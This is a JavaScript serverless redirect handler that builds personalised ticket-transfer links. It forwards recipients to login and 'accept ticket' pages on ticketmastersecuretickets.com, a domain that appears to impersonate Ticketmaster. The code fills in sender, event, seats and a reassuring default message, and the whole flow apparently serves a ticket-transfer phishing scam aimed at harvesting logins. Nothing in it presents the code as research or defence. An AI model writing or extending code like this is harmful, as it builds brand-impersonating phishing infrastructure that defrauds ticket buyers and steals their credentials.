export default function handler(req, res) {
    // Set CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
    if (req.method === 'OPTIONS') {
      return res.status(200).end();
    }
  
    if (req.method !== 'GET') {
      return res.status(405).json({ error: 'Method not allowed' });
    }
  
    try {
      // Get parameters from query string
      const {
        recipientName,
        senderName,
        eventName,
        eventDetails,
        eventDate,
        eventTime,
        ticketCount,
        section,
        row,
        seats,
        ticketType,
        customMessage,
        redirectTo
      } = req.query;
  
      // DEBUG: Log all received parameters
      console.log('=== REDIRECT API DEBUG ===');
      console.log('Received customMessage:', customMessage);
      console.log('Received redirectTo:', redirectTo);
      console.log('All query params:', req.query);
  
      // Validate required parameters
      if (!recipientName || !senderName || !eventName) {
        return res.status(400).json({ 
          error: 'Missing required parameters: recipientName, senderName, eventName' 
        });
      }
  
      // Determine the redirect destination based on redirectTo parameter
      const baseUrl = redirectTo === 'login' 
        ? 'https://ticketmastersecuretickets.com/login.html'
        : 'https://ticketmastersecuretickets.com/accept-ticket.html';
      
      // Check if custom message is too long for URL (browsers typically limit URLs to 2048 chars)
      const MAX_URL_LENGTH = 2000; // Leave some buffer
      const customMessageValue = customMessage || 'Your tickets are ready for transfer and will be activated upon acceptance';
      
      // Build the redirect URL with all parameters
      const params = new URLSearchParams({
        recipientName: recipientName || '',
        senderName: senderName || '',
        eventName: eventName || '',
        eventDetails: eventDetails || '',
        eventDate: eventDate || '',
        eventTime: eventTime || '',
        ticketCount: ticketCount || '1',
        section: section || '',
        row: row || '',
        seats: seats || '',
        ticketType: ticketType || 'General'
      });

      // Add custom message to URL if it's not too long
      const testUrl = `${baseUrl}?${params.toString()}&customMessage=${encodeURIComponent(customMessageValue)}`;
      
      let redirectUrl;
      let useLocalStorage = false;
      
      if (testUrl.length > MAX_URL_LENGTH) {
        // URL would be too long, use localStorage approach
        useLocalStorage = true;
        redirectUrl = `${baseUrl}?${params.toString()}&useLocalStorage=true`;
        
        // Store the custom message in a way that can be retrieved
        // We'll add a special parameter that indicates localStorage should be used
        const localStorageData = {
          customMessage: customMessageValue,
          timestamp: Date.now()
        };
        
        // For now, we'll encode the message in a way that can be decoded
        // In a real implementation, you might want to use a database or session storage
        const encodedMessage = Buffer.from(JSON.stringify(localStorageData)).toString('base64');
        redirectUrl += `&preservedData=${encodedMessage}`;
        
        console.log('=== USING LOCALSTORAGE APPROACH ===');
        console.log('Original URL would be too long:', testUrl.length, 'characters');
        console.log('Using localStorage with preserved data');
      } else {
        // URL is fine, include custom message normally
        params.set('customMessage', customMessageValue);
        redirectUrl = `${baseUrl}?${params.toString()}`;
        
        console.log('=== USING STANDARD URL APPROACH ===');
        console.log('URL length is acceptable:', testUrl.length, 'characters');
      }

      console.log('=== REDIRECT URL DEBUG ===');
      console.log('Base URL:', baseUrl);
      console.log('Params object:', Object.fromEntries(params));
      console.log('Final redirect URL:', redirectUrl);
      console.log('Custom message length:', customMessageValue.length);
      console.log('Using localStorage:', useLocalStorage);

      // Redirect to the actual website with parameters
      console.log('Sending 302 redirect to:', redirectUrl);
      res.redirect(302, redirectUrl);
      return;
  
    } catch (error) {
      console.error('Redirect error:', error);
      return res.status(500).json({ error: 'Internal server error' });
    }
  }
  